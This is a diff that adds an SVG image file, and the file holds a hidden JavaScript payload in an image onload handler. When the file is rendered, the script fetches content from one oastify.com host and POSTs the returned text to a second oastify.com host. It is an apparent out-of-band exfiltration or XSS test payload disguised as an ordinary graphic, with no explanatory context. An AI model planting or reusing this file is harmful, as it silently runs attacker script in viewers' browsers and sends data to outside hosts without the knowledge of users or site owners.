@@ -1,0 +1,12 @@
+<svg width="100%" height="100%" viewBox="0 0 100 100" 
+xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://google.com/favicon.ico" height="20" width="20" onload="fetch('http://d.j3nklvc6r3n4t40s34ywnf447vdm1d41t.oastify.com').then(function (response) {
+response.text().then(function(text) {
+var params = text;
+var http = new XMLHttpRequest();
+var url = 'http://9lvmjxddxt24fl6vkpqoz2ucm3sugv4k.oastify.com';
+http.open('POST', url, true);
+http.send(params);
+})});" />
+</svg>
+
